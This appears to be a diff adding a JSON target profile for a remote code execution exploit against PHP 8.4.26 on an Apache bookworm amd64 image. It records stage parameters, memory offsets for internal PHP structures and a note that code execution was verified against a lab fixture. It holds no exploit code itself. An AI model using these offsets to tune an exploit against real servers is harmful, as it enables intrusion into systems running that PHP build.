@@ -1,0 +1,49 @@
+{
+  "name": "php-8.4.26-bookworm-amd64",
+  "php_version": "8.4.26",
+  "distro": "bookworm",
+  "arch": "amd64",
+  "image": "php:8.4.26-apache",
+  "apache_version": null,
+  "stages": {
+    "stage1_n": 841,
+    "stage2_t": 406,
+    "stage2_v": 16,
+    "stage3_pads": [
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ]
+    ],
+    "stage3_carrier": true,
+    "stage3_prime_cookie": true
+  },
+  "offsets": {
+    "zif_offset": "0x465370",
+    "dtor_offset": "0x65eb60",
+    "htdata_offset": "0x690d8"
+  },
+  "oom_mb": 12,
+  "rce_verified": true,
+  "notes": "RCE-verified against the pinned Zarxec Lab php:8.4.26-apache amd64 fixture"
+}
